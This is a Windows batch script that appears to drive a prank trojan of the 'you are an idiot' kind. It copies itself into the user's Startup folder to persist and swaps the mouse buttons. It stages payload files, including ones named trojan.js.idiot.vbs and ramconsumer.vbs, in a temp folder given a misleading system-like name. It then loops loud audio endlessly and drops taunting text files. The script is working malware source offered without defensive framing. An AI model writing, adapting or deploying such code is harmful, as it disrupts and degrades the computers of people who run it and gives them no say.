@echo off
copy startup.bat "%userprofile%\STARTM~1\Programs\Startup"
Rundll32.exe user32.dll,SwapMouseButton
cd  %temp%
mkdir mswin-lib64-data_structure
cd /D "%~dp0"
copy audio.bat "%temp%\mswin-lib64-data_structure"
copy idiot.mp3 "%temp%\mswin-lib64-data_structure"
copy startup.bat "%temp%\mswin-lib64-data_structure"
copy trojan.js.idiot.vbs "%temp%\mswin-lib64-data_structure"
copy idiots.png "%temp%\mswin-lib64-data_structure"
copy speak.vbs "%temp%\mswin-lib64-data_structure"
copy msgbox.vbs "%temp%\mswin-lib64-data_structure"
copy visual.bat "%temp%\mswin-lib64-data_structure"
copy error.vbs "%temp%\mswin-lib64-data_structure"
copy randombox.vbs "%temp%\mswin-lib64-data_structure"
copy searches.bat "%temp%\mswin-lib64-data_structure"
copy error.bat "%temp%\mswin-lib64-data_structure"
copy fucked.txt "%temp%\mswin-lib64-data_structure"
copy monoxide.mp3 "%temp%\mswin-lib64-data_structure"
copy monoxide_error.mp3 "%temp%\mswin-lib64-data_structure"
copy veryfun.bat "%temp%\mswin-lib64-data_structure"
copy veryfun.vbs "%temp%\mswin-lib64-data_structure"
copy check.vbs "%temp%\mswin-lib64-data_structure"
copy youkilledit.vbs "%temp%\mswin-lib64-data_structure"
copy check.bat "%temp%\mswin-lib64-data_structure"
copy youkilledit.bat "%temp%\mswin-lib64-data_structure"
copy ramconsumer.vbs "%temp%\mswin-lib64-data_structure"
cd %temp%\mswin-lib64-data_structure

start check.vbs

:sound
cd %temp%\mswin-lib64-data_structure
set "file=idiot.mp3"
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%file%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) > %temp%\mswin-lib64-data_structure\sound.vbs

set "file=monoxide.mp3"
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%file%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) > %temp%\mswin-lib64-data_structure\monoxide.vbs

set "file=monoxide_error.mp3"
( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
  echo Sound.URL = "%file%"
  echo Sound.Controls.play
  echo do while Sound.currentmedia.duration = 0
  echo wscript.sleep 100
  echo loop
  echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) > %temp%\mswin-lib64-data_structure\monoxide_error.vbs

set loop=0
:monoxideerror
start "" /min %temp%\mswin-lib64-data_structure\monoxide_error.vbs
timeout /t 4
set /a loop=%loop%+1
if "%loop%"=="4" goto to
goto monoxideerror

:to

set loop=0
:files
set data=idiot_%RANDOM%
set INHALT=you are an idiot haha ha haha ha ha hahaha ha ha ha!!!!! !!!elf!!!!11!1!!!!!1!!1!!!
echo %INHALT% > %data%
set /a loop=%loop%+1 
set /a data=%data%+"x" 
if "%loop%"=="10" goto loop
goto files

:loop
start "" /wait /min %temp%\mswin-lib64-data_structure\sound.vbs
start "" /min %temp%\mswin-lib64-data_structure\monoxide.vbs
goto loop